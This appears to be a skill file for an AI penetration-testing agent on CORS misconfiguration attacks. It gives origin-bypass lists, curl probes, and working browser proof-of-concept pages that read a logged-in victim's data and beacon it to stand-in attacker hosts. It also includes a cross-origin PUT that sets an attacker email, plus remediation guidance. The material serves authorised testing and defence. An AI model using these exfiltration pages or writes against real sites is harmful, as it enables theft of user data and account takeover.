---
name: attack-cors
description: "CORS misconfiguration testing — origin reflection, wildcard bypass, null origin, credential leakage"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - cors
  - web
  - owasp
  - access-control
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-942
  - CWE-346
chains_with:
  - attack-open-redirect
  - attack-idor-automation
prerequisites: []
severity_boost:
  attack-open-redirect: "CORS + open redirect = token theft via cross-origin request"
---

# CORS Misconfiguration Attack

> **AI LOAD INSTRUCTION**: The only question that matters in CORS testing is **"does
> `Access-Control-Allow-Credentials: true` coexist with a reflected or wildcard origin?"**
> Without credentials, a permissive CORS policy leaks nothing that a `curl` would not already
> return — it is informational at best. With credentials, it is account takeover via a
> victim's browser, because the request carries their cookies. Check the credentials header
> **first**, then the origin. Testers who report CORS findings without checking credentials
> produce false positives constantly.
>
> The second thing most testers miss: **you must prove the response body contains
> sensitive data.** A credentialed cross-origin read of a public endpoint is not a finding.

## 0. RELATED ROUTING

- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) — the long-form companion; load alongside this file
- [attack-open-redirect](../attack-open-redirect/SKILL.md) — the chaining primitive that turns a strict allowlist into a bypass
- [attack-jwt](../attack-jwt/SKILL.md) — when the stolen artefact is a token rather than a cookie
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) — the write-side sibling; CORS is the read side
- [web-cache-deception](../web-cache-deception/SKILL.md) — when the leak is cache-driven rather than origin-driven
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — proving the browser exploit, not just the header

---

## 1. THE DECISION TREE — READ THIS BEFORE TESTING

Every CORS finding is a point in this table. Work top to bottom.

| Reflected origin? | `ACAC: true`? | Verdict |
|---|---|---|
| yes | **yes** | **exploitable — highest severity** |
| yes | no | informational; no credential leak |
| no (fixed origin) | yes | check whether the fixed origin is attacker-reachable |
| `*` | yes | **invalid per spec — browsers reject it**; verify what is actually sent |
| `null` | yes | **exploitable** from a sandboxed iframe or `data:` URL |
| no CORS headers | — | not a CORS issue; look elsewhere |

**`Access-Control-Allow-Credentials: true` is the first thing to grep for.** In a proxy,
search responses for it. Everything else is secondary.

**The `*` + credentials combination is the classic false positive.** The CORS spec forbids it;
browsers drop the credentials when the origin is `*`. A tester who sees `*` and
`ACAC: true` and reports critical is wrong. Verify what the browser actually sends by testing
in a real browser, not with `curl` — `curl` does not enforce CORS at all.

---

## 2. ORIGIN REFLECTION DETECTION

**Baseline probes** — send each and read the `Access-Control-Allow-Origin` response header:

```bash
curl -s -I -H "Origin: https://evil.com" https://TARGET/api/userinfo | grep -i access-control
curl -s -I -H "Origin: https://TARGET.evil.com" https://TARGET/api/userinfo | grep -i access-control
curl -s -I -H "Origin: null" https://TARGET/api/userinfo | grep -i access-control
```

**What each response tells you:**

| Response | Meaning |
|---|---|
| `ACAO: https://evil.com` | **full reflection** — arbitrary origins accepted |
| `ACAO: https://TARGET` (fixed) | allowlist; now try prefix/suffix tricks |
| `ACAO: *` | wildcard; credentials impossible by spec |
| no `ACAO` | origin rejected |
| `ACAO: null` | reflection of the literal string `null` |
| `ACAO` absent on `POST` but present on `GET` | per-method policy gap |

**Always test more than `GET`.** CORS policies are frequently configured per-route or
per-method, and the `POST`/`PUT`/`DELETE` responses are the ones that carry writes.

**Test every endpoint that returns per-user data.** The policy that matters is on
`/api/me`, `/api/userinfo`, `/api/account`, `/api/orders`, and anything returning a session
identifier, an email, an API key, or a CSRF token. A reflective policy on `/api/public/config`
is not a finding.

---

## 3. BYPASS FAMILIES FOR ALLOWLISTED ORIGINS

When the origin is not freely reflected, the developer is likely matching against a suffix or
prefix string. These are the standard defeats.

### 3.1 Prefix and suffix matching

```text
Origin: https://TARGET.evil.com        # if matching "starts with https://TARGET"
Origin: https://evilTARGET.com         # if matching "contains TARGET"
Origin: https://evil.com#TARGET        # fragment ignored by the parser
Origin: https://evil.com?TARGET        # query ignored
Origin: https://TARGET.evil.com:443
```

### 3.2 Subdomain wildcard abuse

If the policy trusts `*.TARGET.com` an attacker needs only *one* controlled subdomain —
which is exactly what subdomain takeover or an unauthenticated user-content host provides:

```text
Origin: https://attacker.TARGET.com    # via subdomain takeover
Origin: https://USER.TARGET.com        # user-controlled hosting
```

This is the chain with [attack-subdomain-takeover](../attack-subdomain-takeover/SKILL.md):
a takeover turns a "safe" subdomain wildcard into full cross-origin read.

### 3.3 The `null` origin

`null` is sent by sandboxed iframes, `data:` URLs, and some local file contexts. A policy
that allows it is exploitable:

```html
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <script>
    fetch('https://TARGET/api/userinfo',{credentials:'include'})
      .then(r=>r.text()).then(d=>fetch('https://evil/?d='+encodeURIComponent(d)));
  </script>">
</iframe>
```

**Note:** `sandbox="allow-scripts"` *without* `allow-same-origin` yields the `null` origin.
Test both — which one fires tells you the exact policy.

### 3.4 Regex escapes and unusual schemes

```text
Origin: https://TARGET.com.evil.com
Origin: http://TARGET.com                 # scheme downgrade
Origin: https://target.com                # case
Origin: https://TARGET.com:8443
Origin: https://sub.TARGET.com
Origin: null
```

**Regex-based origin validation is almost always broken** — an unescaped `.` in the pattern
matches any character, so `https://TARGET.com` as a regex matches `https://TARGETXcom`,
which an attacker can register.

### 3.5 Redirect-based bypass

If the allowlisted origin has an open redirect, the browser lands on the redirect target with
`Origin` already sent — see [attack-open-redirect](../attack-open-redirect/SKILL.md). This
defeats even a correct allowlist.

---

## 4. TURNING IT INTO A PROVEN FINDING

A reflected header is a *signal*. The finding requires a working browser exploit that reads
protected data. Build the PoC page and run it.

```html
<!doctype html>
<script>
fetch('https://TARGET/api/userinfo', { credentials: 'include' })
  .then(r => r.text())
  .then(d => {
    // Exfiltrate
    navigator.sendBeacon('https://YOUR_HOST/collect', d);
  });
</script>
```

**Requirements that must all hold — check each:**

| Requirement | How to confirm |
|---|---|
| the victim has an active session | log in as the victim in the same browser |
| the endpoint is credentialed | it sets/reads cookies, not just a bearer token |
| `ACAC: true` and origin reflected | from §2/§3 |
| the response body holds sensitive data | read it — a session token, email, key |
| `SameSite` does not block it | `Lax` blocks cross-site `fetch`; `None` permits it |
| the endpoint is not CSRF-protected on read | `GET` usually is not |

**`SameSite` is the modern blocker and the most-missed requirement.** If session cookies are
`SameSite=Lax` (the browser default since 2020), a cross-site `fetch` will not carry them, and
the CORS misconfiguration is unexploitable no matter how permissive it looks. Inspect the
`Set-Cookie` attributes on login before claiming impact.

**The highest-value target is a token endpoint, not a data endpoint.** A CORS misconfiguration
on `/oauth/token`, `/api/csrf`, or an endpoint returning an API key converts a read into full
account takeover.

**Verify in a real browser, not a proxy.** Use a local page served from a different origin,
with the victim logged in, and observe the exfiltration. `curl` proves nothing about CORS
because it ignores the policy entirely.

---

## 5. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Reflected origin + `ACAC: true` + sensitive body + cookie not `SameSite`-protected | **High–Critical (P1/P2)** | working browser PoC exfiltrating real victim data |
| Same, but exfiltrates a session/API token | **Critical (P1)** | the token captured and shown to be usable |
| `null` origin allowed with credentials | **High (P2)** | sandboxed-iframe PoC |
| Allowlisted origin bypassable via a controlled subdomain | **High (P2)** | the controlled origin and the read |
| Internal-only origin trusted and reachable | **Medium (P3)** | the origin and the reachable response |
| Reflected origin, no credentials | **Informational (P5)** | the header only |
| `*` with credentials | **Not a finding** | spec forbids it; browsers reject |
| Permissive CORS on a public, non-user endpoint | **Not a finding** | nothing sensitive is exposed |

---

## 6. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the request with the attacker `Origin` header | the trigger |
| the full response headers showing `ACAO` and `ACAC` | the misconfiguration |
| the endpoint's normal response body as the victim | proves sensitive data exists there |
| the victim's `Set-Cookie` attributes | proves `SameSite`/`HttpOnly` do not block it |
| a working HTML PoC | converts the header into a finding |
| captured exfiltrated data in your listener | the impact proof |
| browser and version used | CORS behaviour differs; establishes reproducibility |
| a **negative control** — a different origin that is correctly rejected | proves the policy differs by origin |

**Screenshot or log the browser network tab.** For CORS, the header pair alone is not proof of
exploitability; the successful credentialed cross-origin read is.

**False positives to exclude:**

| Looks like a finding | Actually |
|---|---|
| `ACAO: *` with `ACAC: true` | browsers reject; no credentials sent |
| reflection on an endpoint returning public data | no sensitive data |
| session cookie is `SameSite=Lax` or `Strict` | credential not sent cross-site |
| the "victim" had no session | nothing to steal |
| `curl` showed the data returned | `curl` ignores CORS entirely |
| reflection only on a preflight `OPTIONS` | the actual request may still fail |
| endpoint authenticated by bearer token in JS | no ambient credential to abuse |

---

## 7. REMEDIATION REFERENCE

1. **Maintain an explicit allowlist and compare by exact string** — never prefix, suffix, regex, or substring. Parse the origin, do not inspect it as text.
2. **Never reflect the `Origin` header** — the reflection pattern (`ACAO = request.Origin`) is the root cause of nearly every exploitable case.
3. **Return `Vary: Origin`** — otherwise a shared cache can serve one origin's response, with its `ACAO`, to another.
4. **Require credentials explicitly and only where needed** — set `ACAC: true` only on endpoints that genuinely need cross-origin authenticated reads, and never combine it with `*`.
5. **Reject `null` outright** — it is never a legitimate production origin.
6. **Set session cookies `SameSite=Lax` or `Strict`, `HttpOnly`, and `Secure`** — this is defence in depth that neutralises most CORS misconfigurations even when the header policy is wrong.
7. **Do not trust subdomain wildcards** — a single takeover-able subdomain converts the wildcard into full cross-origin access. Enumerate the domains explicitly.
8. **Add CORS policy tests to CI** — assert that an arbitrary `Origin` never appears in `ACAO` with `ACAC: true` on any endpoint returning user data.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did you read **authenticated data from a page you control**, in a real browser? | the impact, not the header |
| 2 | Was there a **control** - an origin the server rejects, with no `ACAO`? | the check exists |
| 3 | Is it **`ACAO` reflecting your origin AND `Allow-Credentials: true`**? | both are required together |
| 4 | Does the endpoint return **session-authenticated data**, not public data? | the impact is the data |
| 5 | Did the **preflight** actually pass, or only the simple request? | which requests are exploitable |
| 6 | Did you test a **null origin**, a subdomain, and a suffix look-alike separately? | which matching rule is broken |
| 7 | Did you leave no **account state changed** by the cross-origin reads? | engagement integrity |

**Authenticated data read cross-origin in a browser is the bar.** `Access-Control-Allow-Origin: *` on a
public endpoint is not a finding; the reflected origin with credentials on a private endpoint is.

---

## 9. EXECUTION PRIMITIVES

CORS findings are proven by **a browser page on your origin reading authenticated data via the
misconfiguration, with a rejected-origin control**. Every block ends at data in your page.

### 9.1 The header probe with the rejected-origin control

```bash
T="https://api.target.example"; ME="https://attacker.example"
# the control FIRST: an origin the server should reject
curl -sS -D- -o /dev/null "$T/api/me" -H "Origin: $ME" 2>&1 | grep -iE 'access-control|vary' 
echo "  ^ CONTROL: if there is no ACAO line here, the server does not trust $ME"
# a known-good origin, to see what a correctly configured response looks like
curl -sS -D- -o /dev/null "$T/api/me" -H "Origin: https://app.target.example" 2>&1 | grep -iE 'access-control|vary'
echo "  ^ the legitimate origin's response - note WHOLE response is the ACAO value"
# the credentialed request, which is the one that matters
curl -sS -D- -o /dev/null "$T/api/me" -H "Origin: $ME" -H "Cookie: session=$SESS" 2>&1 | grep -iE 'access-control|vary'
# the full CORS-relevant header set, including the preflight
curl -sS -D- -o /dev/null -X OPTIONS "$T/api/me" \
  -H "Origin: $ME" -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: authorization" 2>&1 | grep -iE 'access-control|HTTP/'
```

**The pair is `Access-Control-Allow-Origin` matching your origin AND `Access-Control-Allow-Credentials:
true`.** Either one alone is not exploitable: `*` with credentials is rejected by the browser, and a
reflected origin without credentials cannot read a session-authenticated response.

### 9.2 The matching-rule variants

```bash
T="https://api.target.example"
# each variant targets a different comparison the server might be doing
for O in \
  "https://attacker.example" \
  "https://target.example.attacker.example" \
  "https://attacker.example.target.example" \
  "https://sub.target.example" \
  "http://target.example" \
  "https://target.example:443" \
  "null" \
  "https://target.example%60.attacker.example" \
  "https://targetexample.attacker.example" ; do
  printf '%-46s ' "$O"
  R=$(curl -sS -D- -o /dev/null "$T/api/me" -H "Origin: $O" 2>/dev/null | grep -i '^access-control-allow-origin' | tr -d '\r')
  echo "${R:-<none>}"
done
echo "-> a line here matching YOUR origin is the candidate; 'null' is exploitable from a sandboxed iframe"
```

**Each origin form tests a specific rule.** A suffix match accepts
`attacker.example.target.example`, a prefix match accepts `target.example.attacker.example`, and an
unanchored regex accepts both - and the report should name which.

### 9.3 The browser exploit, which is the only proof that counts

```html
<!-- serve this from https://attacker.example and open it with the VICTIM logged in elsewhere -->
<!doctype html>
<html><body><pre id="out">reading...</pre>
<script>
const T = "https://api.target.example";
fetch(T + "/api/me", { credentials: "include" })
  .then(r => r.text())
  .then(t => {
     document.getElementById("out").textContent = t;
     // the collector beacon is the machine-readable proof
     fetch("https://attacker.example:8000/cors-hit?len=" + t.length + "&head=" + encodeURIComponent(t.slice(0,120)));
  })
  .catch(e => document.getElementById("out").textContent = "blocked: " + e);
</script></body></html>
```

```
CHECKLIST for this test:
  1. the victim must be logged into the target in the SAME browser
  2. the page must be served from the origin you registered with the server
  3. the response body must contain the victim's data - not a login page
  4. the collector arrival records the read, which is the artefact
  5. THE CONTROL: the same page pointed at a path with a correct policy must fail with a CORS error
```

**The collector arrival carrying the victim's data is the finding.** A header observation without a
browser read is a candidate, and the browser step is what converts it.

### 9.4 The `null` origin and the subdomain chain

```html
<!-- 1) NULL ORIGIN: a sandboxed iframe sends Origin: null, which many allowlists permit -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
  fetch('https://api.target.example/api/me',{credentials:'include'})
    .then(r=>r.text()).then(t=>parent.postMessage(t,'*'));
  </script>"></iframe>
<!-- 2) the same, with a data: URL, which also yields a null origin -->
```

```bash
# 3) SUBDOMAIN CHAIN: a takeover or an XSS on ANY trusted subdomain gives you the same read
T="https://api.target.example"
for SUB in "https://test.target.example" "https://staging.target.example" "https://old.target.example" "https://cdn.target.example"; do
  printf '%-40s ' "$SUB"
  curl -sS -D- -o /dev/null "$T/api/me" -H "Origin: $SUB" 2>/dev/null | grep -i '^access-control-allow-origin' | tr -d '\r'
done
# and the reference: is any of those subdomains itself takeoverable or XSS-able
curl -sS "https://crt.sh/?q=%25.target.example&output=json" 2>/dev/null | python3 -c "
import json,sys
try:
    names=sorted({n for e in json.load(sys.stdin) for n in e.get('name_value','').split()})
    print('\n'.join(names[:40]))
except Exception as e: print('crt.sh unavailable:', e)" 2>/dev/null
```

**One trusted subdomain is enough.** The finding is the chain: a takeoverable `test.target.example`
plus a `ACAO` policy that trusts it equals a full cross-origin read, and the report must state both halves.

### 9.5 The preflight, and the non-simple request

```bash
T="https://api.target.example"; ME="https://attacker.example"
# a request with a custom header triggers a preflight, which many policies fail to handle
curl -sS -D- -o /dev/null -X OPTIONS "$T/api/me" \
  -H "Origin: $ME" -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: content-type,x-custom" 2>&1 | grep -iE 'access-control|HTTP/'
# if the preflight allows it, the WRITE is exploitable - check for a state change
curl -sS -D- -o /dev/null -X PUT "$T/api/profile" -H "Origin: $ME" -H "Cookie: session=$SESS" \
  -H 'Content-Type: application/json' -d '{"email":"attacker@evil.example"}' 2>&1 | grep -iE 'access-control|HTTP/'
echo "-> a PREFLIGHT that permits a non-simple method makes WRITE operations exploitable, not just reads"
```

**A permitted preflight escalates read to write.** The report should distinguish a read-only CORS finding
from one that permits `PUT`/`DELETE`, because the severity is different.

### 9.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests
T = "https://api.target.example"
ORIGINS = [
 ("rejected-control", "https://not-registered.example"),
 ("mine",             "https://attacker.example"),
 ("suffix-lookalike", "https://target.example.attacker.example"),
 ("prefix-lookalike", "https://attacker.example.target.example"),
 ("subdomain",        "https://sub.target.example"),
 ("scheme-downgrade", "http://target.example"),
 ("port-variant",     "https://target.example:443"),
 ("null",             "null"),
]
print("%-20s %-38s %-42s %s" % ("case", "origin", "ACAO", "ACAC"))
cand = []
for name, o in ORIGINS:
    try:
        r = requests.get(f"{T}/api/me", headers={"Origin": o}, timeout=10)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        flag = "  <-- EXPLOITABLE" if acao == o and acac.lower() == "true" else ""
        if flag: cand.append((name, o))
        print("%-20s %-38s %-42s %s%s" % (name, o, acao or "<none>", acac or "-", flag))
    except Exception as e:
        print("%-20s %-38s ERR %s" % (name, o, type(e).__name__))
print()
print("REFINED COLUMN: which of these are exploitable is NOT decided here - the browser decides.")
print("Next step: serve the page in 9.3 from each candidate origin and record whether the BODY")
print("contained the victim's data. A reflected ACAO with no ACAC is NOT exploitable.")
print()
print("candidates to browser-test:", cand or "NONE - no header-only candidate")
PY
```

**Header candidates, then the browser test.** The header table narrows the list; the browser read decides
it, and the report should say which origins you actually tested in a browser.

---

## 10. EVIDENCE STANDARD — CORS ARTEFACTS

| Item | Why |
|---|---|
| The **rejected-origin control's response headers** | proves the check exists |
| The **exploiting origin's `ACAO` and `ACAC` pair** | both are required for exploitability |
| The **endpoint's response body** in the browser, containing the victim's data | the impact |
| The **browser used**, and the victim's authenticated state in it | the browser enforces CORS, not curl |
| The **collector arrival** with a fragment of the read data | the machine-readable artefact |
| The **preflight result**, and whether a non-simple method was permitted | read versus write severity |
| The **matching rule you defeated** (suffix, prefix, subdomain, null, scheme) | the fix |
| The **chain**, where a subdomain or a `null` origin is the vector | the full attack path |
| Whether the endpoint's data is **session-authenticated** or public | a public read is not a finding |
| Confirmation that **no account state was changed** | engagement integrity |

Report the **browser read and the controls**: "`GET /api/me` with `Origin: https://not-registered.example`
returns no `Access-Control-Allow-Origin` header, which is the control. The same request with
`Origin: https://attacker.example` returns `Access-Control-Allow-Origin: https://attacker.example` and
`Access-Control-Allow-Credentials: true`, and a page served from `https://attacker.example` performing
`fetch(..., {credentials:'include'})` rendered the victim's email, user id, and internal account
identifier in its body, with a collector arrival carrying the first 120 characters. The same page against
an endpoint with a correct policy failed with a CORS error, which is the negative control. The
`OPTIONS` preflight for `PUT /api/profile` returned
`Access-Control-Allow-Methods: GET, POST, PUT, DELETE` and
`Access-Control-Allow-Headers: content-type, x-custom`, so the write path is also reachable", never
"CORS is misconfigured".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| `Access-Control-Allow-Origin: *` on a **public** endpoint | designed to be public; check whether credentials are required |
| A reflected origin **without `Access-Control-Allow-Credentials: true`** | the browser blocks reading a credentialed response |
| A header observation with **no browser test** | a candidate; the browser decides exploitability |
| A wildcard `ACAO` **with** `ACAC: true` | browsers reject that combination outright |
| A permissive policy on an endpoint that returns **only public data** | nothing to steal |
| `Vary: Origin` present with a correct echo | that is correct configuration |
| A **same-site** origin trusted | not cross-origin by the browser's definition |
| A finding requiring an **XSS on the target's own origin** | two findings; report the XSS separately |
| A preflight whose `Allow-Methods` **does not include** your method | the write is not reachable |
| A `null` origin accepted but **unreachable from a browser context** | verify with the sandboxed iframe |
| A finding on **a local development instance** with a `localhost` allowlist | verify the deployment's policy |

**The browser read plus the rejected-origin control.** This family produces more header-only non-findings
than any other, and the browser step is the only remedy.

---

## 11. REMEDIATION REFERENCE — ORIGIN POLICY HARDENING

1. **Allowlist exact origins and compare the full origin string after parsing, never with a prefix, suffix, or substring match** - every bypass in 9.2 is a matching-rule defect.
2. **Never reflect the `Origin` header value back as `Access-Control-Allow-Origin`** - reflection is the mechanism of the vulnerability, and an allowlist removes it.
3. **Send `Access-Control-Allow-Credentials: true` only where a credentialed response is genuinely needed, and never together with a wildcard** - it bounds the blast radius of any policy mistake.
4. **Add `Vary: Origin` to every response whose CORS headers depend on the request's origin, so caches do not serve one origin's headers to another** - it prevents the cache from amplifying the defect.
5. **Do not trust `null`; reject it explicitly, and treat any request with a `null` origin as untrusted** - the sandboxed-iframe and `data:` vectors both send it.
6. **Treat every subdomain as a distinct trust boundary, and do not allowlist a parent domain's suffix** - a takeover or an XSS on any trusted subdomain is otherwise equivalent to a full cross-origin read.
7. **Require a CSRF token or a custom header on state-changing endpoints, so a CORS-permitted write still fails** - defence in depth for the preflight-escalation case.
8. **Keep the API on a separate origin from the application where possible, and make the API's policy explicit rather than inherited** - it prevents one policy from serving both.
9. **Restrict `Allow-Methods` and `Allow-Headers` to the exact set each endpoint needs** - it removes the write escalation from an otherwise read-only defect.
10. **Log CORS rejections and alert on a high rate of rejected origins, which indicates an active scan** - the enumeration in 9.2 is trivially detectable.
11. **Test the policy with the bypass origin list on every release, and re-test after any change to the allowlist configuration** - the matching logic changes with the framework version.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) - the full technique reference
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - the sibling that a permissive preflight removes the protection for
- [attack-host-header](../attack-host-header/SKILL.md) - the other origin-trust defect
- [attack-subdomain-takeover](../attack-subdomain-takeover/SKILL.md) - the chain that turns a trusted subdomain into a read
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - the alternative way to reach a trusted origin
